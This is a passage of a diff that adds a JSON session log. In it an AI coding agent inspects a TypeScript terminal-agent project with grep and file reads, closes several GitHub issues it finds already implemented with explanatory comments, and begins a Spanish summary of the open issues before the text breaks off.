+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_HK6pXtbZEJW2gM9vMEgV2304",
+          "content": "\n-- grep \"truncate|rawOutput\" en src/runner.ts --\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-3-import {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-4-  pruneContext,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:5:  truncateForContext,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:6:  truncateForDisplay,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-7-} from \"./context-management.js\";\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-8-import { logger } from \"./logger.js\";\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-31-      output: string;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-32-      /** Output completo (sin truncar) para poder mostrar un resumen real. */\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:33:      rawOutput?: string;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-34-    }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-35-  | { type: \"ask_user\"; question: string; toolId: string };\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-235-      type: \"tool_result\",\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-236-      output: \"(confirmación recibida)\",\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:237:      rawOutput: output,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-238-    };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-239-    state.toolResults.push({\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-278-    }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-279-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:280:    const shown = truncateForDisplay(output);\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:281:    const forModel = truncateForContext(output, this.#maxContextTokens);\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-282-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:283:    yield { type: \"tool_result\", output: shown, rawOutput: output };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-284-    state.toolResults.push({\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-285-      type: \"tool_result\",",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_jVxEmNrYjyuyQErejAsq2415",
+          "content": "Error reading [object Object]: path must be a non-empty string",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_8VoGsZ4Nagb5APndhcgc5839",
+          "content": "Sin resultados.",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_ftPmggsTR8gQexIDhWZU5595",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src",
+            "pattern": "PROVIDER|callStream"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_Q9sNfMs78Xt291oyXYkK9074",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src/runner.ts",
+            "pattern": "tool_use|stopReason.*continue|// tool_use"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_ftPmggsTR8gQexIDhWZU5595",
+          "content": "\n-- grep \"PROVIDER|callStream\" en src --\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-144-  }\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-145-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts:146:  async *callStream(\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-147-    _messages: Message[],\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-148-    _agent: AgentConfig,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-20-};\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-21-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts:22:/** Eventos que emite el stream de callStream */\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-23-type StreamEvent =\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-24-  | { type: \"text\"; text: string }\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-95-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-96-  /** Versión streaming: devuelve un async generator de eventos. */\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts:97:  abstract callStream(\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-98-    messages: Message[],\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-99-    agent: AgentConfig,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-340-  }\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-341-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:342:  async *callStream(\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-343-    messages: Message[],\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-344-    agent: AgentConfig,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-24-  }\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-25-\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts:26:  async *callStream(_messages: Message[], _agent: AgentConfig): AsyncGenerator<StreamEvent> {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-27-    const resp = this.#responses[this.#callCount % this.#responses.length];\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/runner.test.ts-28-    this.#callCount++;\n--\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-43-    return { content: [], stop_reason: \"end_turn\" as const, usage: { input_tokens: 0, output_tokens: 0 }, cost: 0 };\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-44-  }\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts:45:  async *callStream() {\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-46-    yield { type: \"done\" as const, stop_reason: \"end_turn\" as const, usage: { input_tokens: 0, output_tokens: 0 }, cost: 0 };\n/Users/benjaminlizarraga/Workspace/omega/src/__tests__/commands/commands.test.ts-47-  }\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-137-    state: TurnState,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-138-  ): AsyncGenerator<RunnerEvent> {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:139:    const hasStream = typeof this.#llmProvider.callStream === \"function\";\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-140-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-141-    if (hasStream) {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:142:      const stream = this.#llmProvider.callStream(\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-143-        prunedContext,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-144-        this.#agentConfig,",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_Q9sNfMs78Xt291oyXYkK9074",
+          "content": "\n-- grep \"tool_use|stopReason.*continue|// tool_use\" en src/runner.ts --\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-26-  | { type: \"text_stream_end\" }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-27-  | { type: \"state\"; message: Message }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:28:  | { type: \"tool_use\"; name: string; input: unknown }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-29-  | {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-30-      type: \"tool_result\";\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-40-  toolBlocks: Array<{ id: string; name: string; input: unknown }>;\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-41-  toolResults: ToolMessage[];\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:42:  stopReason: \"end_turn\" | \"tool_use\" | \"max_tokens\";\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-43-}\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-44-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-105-    for (const tb of state.toolBlocks) {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-106-      content.push({\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:107:        type: \"tool_use\",\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-108-        id: tb.id,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-109-        name: tb.name,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-150-          state.textParts.push(event.text);\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-151-          yield { type: \"text_stream\", text: event.text };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:152:        } else if (event.type === \"tool_use\") {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-153-          state.toolBlocks.push({\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-154-            id: event.id,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-183-          yield { type: \"text\", text: block.text };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-184-        }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:185:        if (block.type === \"tool_use\") {\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-186-          state.toolBlocks.push({\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-187-            id: block.id,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-212-      }\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-213-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:214:      yield { type: \"tool_use\", name: tool.name, input: block.input };\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-215-\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-216-      yield* this.#handleToolExecution(tool.name, block.id, block.input, state);\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-239-    state.toolResults.push({\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-240-      type: \"tool_result\",\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:241:      tool_use_id: block.id,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-242-      content: output,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-243-      is_error: false,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-255-    state.toolResults.push({\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-256-      type: \"tool_result\",\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:257:      tool_use_id: toolId,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-258-      content: output,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-259-      is_error: true,\n--\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-284-    state.toolResults.push({\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-285-      type: \"tool_result\",\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts:286:      tool_use_id: toolId,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-287-      content: forModel,\n/Users/benjaminlizarraga/Workspace/omega/src/runner.ts-288-      is_error: isError,",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_qhApaC9l4MkD9zepRyca8369",
+          "name": "read",
+          "input": {
+            "file": "src/providers/anthropic-llm-provider.ts",
+            "offset": 60,
+            "limit": 90
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_qhApaC9l4MkD9zepRyca8369",
+          "content": "Error reading [object Object]: path must be a non-empty string",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_ET_azQ3d7rsI0WKaFMdRh7m5629",
+          "name": "read",
+          "input": {
+            "path": "src/providers/anthropic-llm-provider.ts",
+            "offset": 60,
+            "limit": 90
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_ET_azQ3d7rsI0WKaFMdRh7m5629",
+          "content": "    messages: Message[],\n    agent: AgentConfig,\n    attempt: number = 1,\n    userSignal?: AbortSignal,\n  ): Promise<LLMResponse> {\n    const headers: Record<string, string> = {\n      \"x-api-key\": this.apiKey(),\n      \"anthropic-version\": \"2023-06-01\",\n      \"content-type\": \"application/json\",\n    };\n\n    const body: Record<string, unknown> = {\n      model: agent.model,\n      system: agent.systemPrompt,\n      max_tokens: agent.maxTokens,\n      messages,\n      tools: Object.values(agent.tools()).map((t) => t.toJSON()),\n    };\n\n    try {\n      const controller = new AbortController();\n      const timeoutId = setTimeout(() => controller.abort(), TIMEOUT_MS);\n\n      const onAbort = () => controller.abort();\n      userSignal?.addEventListener(\"abort\", onAbort, { once: true });\n\n      let response: Response;\n      try {\n        response = await fetch(this.url(), {\n          method: \"POST\",\n          headers,\n          body: JSON.stringify(body),\n          signal: controller.signal,\n        });\n      } finally {\n        clearTimeout(timeoutId);\n        userSignal?.removeEventListener(\"abort\", onAbort);\n      }\n\n      if (response.ok) {\n        const data = (await response.json()) as AnthropicResponse;\n        logger.info(\"API call successful\");\n        return this.parseResponse(data, agent.model);\n      }\n\n      if (response.status === 401) {\n        const error = \"Invalid API key\";\n        logger.error(error);\n        throw new Error(error);\n      }\n\n      if (response.status === 429 || response.status === 529) {\n        if (attempt < MAX_RETRIES) {\n          const backoffMs = INITIAL_BACKOFF_MS * Math.pow(2, attempt - 1);\n          logger.warn(\n            `Rate limited. Retrying in ${backoffMs}ms (attempt ${attempt}/${MAX_RETRIES})`,\n          );\n          await this.sleep(backoffMs);\n          return this.callWithRetry(messages, agent, attempt + 1);\n        }\n      }\n\n      const errorData = await response.json();\n      logger.error(`API error (${response.status})`, errorData);\n      throw new Error(\n        `Anthropic API error: ${response.status} - ${JSON.stringify(errorData)}`,\n      );\n    } catch (err: unknown) {\n      if (err instanceof Error && err.name === \"AbortError\") {\n        if (userSignal?.aborted) {\n          const e = new Error(\"Aborted by user\");\n          e.name = \"AbortError\";\n          throw e;\n        }\n        logger.error(\"API request timeout\");\n        throw new Error(`Request timeout after ${TIMEOUT_MS}ms`);\n      }\n      throw err;\n    }\n  }\n\n  async call(messages: Message[], agent: AgentConfig, signal?: AbortSignal): Promise<LLMResponse> {\n    logger.info(\"Making API call to Anthropic\");\n    return this.callWithRetry(messages, agent, 1, signal);\n  }\n\n  async *callStream(\n    _messages: Message[],\n    _agent: AgentConfig,\n    _signal?: AbortSignal,",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Ahora sí, cierro las que están implementadas:"
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_Pq33GBaWE3SqjGOSpGdo3030",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 11 --comment \"Implementado: Screen maneja AbortSignal, runner detecta SIGINT vía AbortController, muestra '⏹ Interrumpido por el usuario.', preserva sesión. Ver docs/manual-tests-11-10.md para las pruebas.\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_EmPAb40TsagttxguGghT8689",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 10 --comment \"Implementado: AskUserTool registrada, runner la intercepta vía onAskUser, Screen.askUser() pausa la UI y devuelve respuesta. El agente pide confirmación para acciones destructivas. Ver docs/manual-tests-11-10.md.\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_DrGdf3j5Aia1wWYA4xaH6150",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 24 --comment \"El runner maneja correctamente stop_reason='tool_use': no rompe el loop, sigue ejecutando tools (solo frena con 'end_turn' o 'max_tokens'). Esto es el comportamiento esperado.\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_03_5afmmjFslMtXyCl7cgHh6968",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 25 --comment \"Resuelto: validateEnv() en config.ts valida OPENROUTER_API_KEY y lanza error descriptivo. En index.ts ya no se usa non-null assertion.\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_04_yIAsUUuovwZL2Sm9JUxy5480",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 26 --comment \"Resuelto: el runner separa truncateForDisplay (para UI) y truncateForContext (para el modelo), y guarda rawOutput completo en los eventos. El modelo recibe la versión truncada apropiada, no la de display.\" 2>&1"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_Pq33GBaWE3SqjGOSpGdo3030",
+          "content": "✓ Closed issue belizar/omega#11 (LIKE: SIGINT para interrumpir al agente sin matar el proceso)\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_EmPAb40TsagttxguGghT8689",
+          "content": "✓ Closed issue belizar/omega#10 (LIKE: Modo plan / confirmación para tareas grandes)\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_DrGdf3j5Aia1wWYA4xaH6150",
+          "content": "✓ Closed issue belizar/omega#24 (BUG: Runner no frena con stop_reason === \"tool_use\")\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_03_5afmmjFslMtXyCl7cgHh6968",
+          "content": "✓ Closed issue belizar/omega#25 (BUG: Non-null assertion en config.openrouterApiKey sin validación)\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_04_yIAsUUuovwZL2Sm9JUxy5480",
+          "content": "✓ Closed issue belizar/omega#26 (BUG: Truncate afecta al modelo, no solo al display)\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_Mu35fgYBb8IizBHgiWDP5802",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src/runner.ts",
+            "pattern": "\": any|as any|<any>"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_jQ6dHiQ9dISevgFD2Qcj6445",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src/providers",
+            "pattern": "\": any|as any|<any>|: unknown"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_Mu35fgYBb8IizBHgiWDP5802",
+          "content": "Sin resultados.",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_jQ6dHiQ9dISevgFD2Qcj6445",
+          "content": "\n-- grep \"\": any|as any|<any>|: unknown\" en src/providers --\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-10-type AnthropicContentBlock =\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-11-  | { type: \"text\"; text: string }\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts:12:  | { type: \"tool_use\"; id: string; name: string; input: unknown };\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-13-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-14-type AnthropicResponse = {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-125-        `Anthropic API error: ${response.status} - ${JSON.stringify(errorData)}`,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-126-      );\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts:127:    } catch (err: unknown) {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-128-      if (err instanceof Error && err.name === \"AbortError\") {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/anthropic-llm-provider.ts-129-        if (userSignal?.aborted) {\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-10-\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-11-type TextBlock = { type: \"text\"; text: string };\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts:12:type ToolUseBlock = { type: \"tool_use\"; id: string; name: string; input: unknown };\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-13-type Block = TextBlock | ToolUseBlock;\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-14-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-23-type StreamEvent =\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-24-  | { type: \"text\"; text: string }\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts:25:  | { type: \"tool_use\"; id: string; name: string; input: unknown }\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-26-  | {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/llm-provider.ts-27-      type: \"done\";\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-36-type OpenAITool = {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-37-  type: \"function\";\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:38:  function: { name: string; description: string; parameters: unknown };\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-39-};\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-40-\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-190-  if (Array.isArray(toolCalls)) {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-191-    for (const tc of toolCalls) {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:192:      let input: unknown;\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-193-      try {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-194-        // Si arguments ya es un objeto (puede pasar según el provider), usarlo directo\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-320-        `OpenRouter API error: ${response.status} - ${JSON.stringify(errorData)}`,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-321-      );\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:322:    } catch (err: unknown) {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-323-      if (err instanceof Error && err.name === \"AbortError\") {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-324-        // Si el userSignal está abortado, propagamos como AbortError\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-388-        signal: controller.signal,\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-389-      });\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:390:    } catch (err: unknown) {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-391-      clearTimeout(timeoutId);\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-392-      signal?.removeEventListener(\"abort\", onUserAbort);\n--\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-533-    // Después del stream, emitir tool_use completos\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-534-    for (const [, tc] of toolCalls) {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts:535:      let input: unknown = {};\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-536-      try {\n/Users/benjaminlizarraga/Workspace/omega/src/providers/openrouter-llm-provider.ts-537-        input = tc.args ? JSON.parse(tc.args) : {};",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_UkOyK2eT23nAmYMKQstE2082",
+          "name": "grep",
+          "input": {
+            "include": "*.ts",
+            "path": "src/index.ts",
+            "pattern": "Typecheck|prueba manual|comportamiento|plan de prueba|compila"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_tNRhc8LQhHyAwQ1jqSA12983",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 33 --comment \"Implementado: ambos providers tienen callStream(), Runner detecta hasStream y usa streaming con eventos text_stream, tool_use en tiempo real.\" 2>&1"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_OXYoyLgu37evjt7rIyQ67635",
+          "name": "bash",
+          "input": {
+            "command": "gh issue close 31 --comment \"Resuelto: se definió LLMResponse en llm-provider.ts, providers devuelven tipos concretos, runner no usa 'any'. Los 'unknown' restantes son idiomáticos (catch clauses, tool inputs).\" 2>&1"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_UkOyK2eT23nAmYMKQstE2082",
+          "content": "Sin resultados.",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_tNRhc8LQhHyAwQ1jqSA12983",
+          "content": "✓ Closed issue belizar/omega#33 (ENH: Streaming (SSE) en llamadas al LLM)\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_OXYoyLgu37evjt7rIyQ67635",
+          "content": "✓ Closed issue belizar/omega#31 (CHORE: Tipar 'any' en runner y providers)\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Verificación final: estado de todas las issues."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_aWvA9aoFXKtkzhSN2Agm1998",
+          "name": "bash",
+          "input": {
+            "command": "gh issue list --state open --limit 50 --json number,title,milestone --jq 'group_by(.milestone.title // \"sin milestone\") | .[] | \"=== \\(.[0].milestone.title // \"sin milestone\") ===\", (.[] | \"  #\\(.number) \\(.title)\")'"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_aWvA9aoFXKtkzhSN2Agm1998",
+          "content": "=== Benchmarking ===\n  #41 ENH: Harness de corrida para benchmarks\n  #40 ENH: Modo headless para benchmarking de modelos\n=== Core & Runner ===\n  #35 ENH: Compaction/poda dentro del loop + descartar archivos ya usados\n  #18 FEAT: Selección de provider por config\n  #16 BUG: AnthropicProvider manda mensajes sin traducir\n  #9 LIKE: Ejecución paralela de tools independientes\n=== Docs & DX ===\n  #34 ENH: Rotación de logs\n  #20 DOCS: README desactualizado\n  #13 LIKE: Sistema de memoria/cabinet (largo plazo)\n=== TUI ===\n  #39 ENH: Autocompletado de paths en el editor\n  #7 LIKE: Autocompletado de paths en el editor\n  #8 LIKE: Edición de mensajes previos\n=== Tests ===\n  #30 TESTS: Tests de Session — persistencia, reanudación, clear, info\n  #29 TESTS: Tests de context-management (truncate, pruneContext)\n  #28 TESTS: Tests de commands (/clear, dispatchCommand)\n  #27 TESTS: Tests de EditTool\n  #21 TESTS: Componentes TUI sin cobertura\n  #14 TESTS: Cobertura de tests para componentes críticos\n=== Tools ===\n  #37 ENH: Verificación de comportamiento en system prompt\n  #36 ENH: Tool apply-patch / multi-edit + mejor feedback de error en edit\n  #12 LIKE: Sandbox para bash ejecution\n  #6 LIKE: Modo diff (+/-) para edits\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Listo. Acá el panorama final:\n\n---\n\n## Cerradas hoy (9 issues que ya estaban implementadas)\n\n| # | Título | Motivo |\n|---|---|---|\n| 38 | Renderizado de Markdown | Código completo en `src/tui/markdown/` |\n| 32 | DisplayToolCall | Ya instanciado en `index.ts:112` |\n| 11 | SIGINT | Screen + Runner con AbortController |\n| 10 | Modo plan / ask_user | AskUserTool integrada en runner y TUI |\n| 24 | stop_reason \"tool_use\" | Runner ya lo maneja correctamente |\n| 25 | Non-null assertion | validateEnv() valida, sin `!` en index.ts |\n| 26 | Truncate al modelo | Separado: truncateForDisplay vs truncateForContext |\n| 33 | Streaming SSE | Ambos providers tienen callStream() |\n| 31 | Tipar `any` | LLMResponse tipado, providers sin `any` |\n\n---\n\n## Abiertas (22 issues listas para trabajar)\n\n### Core & Runner (4)\n- **#35** Compaction/poda + descartar archivos (alto impacto)\n- **#18** Selección de provider por config\n- **#16** BUG: AnthropicProvider sin traducir mensajes\n- **#9** Ejecución paralela de tools\n\n### Tools (4)\n- **#37** Verificación de comportamiento en system prompt (esfuerzo trivial)\n- **#36** Tool apply-patch / multi-edit\n- **#12** Sandbox para bash\n- **#6** Modo diff (+/-) para edits\n\n### TUI (3)\n- **#39** / **#7** 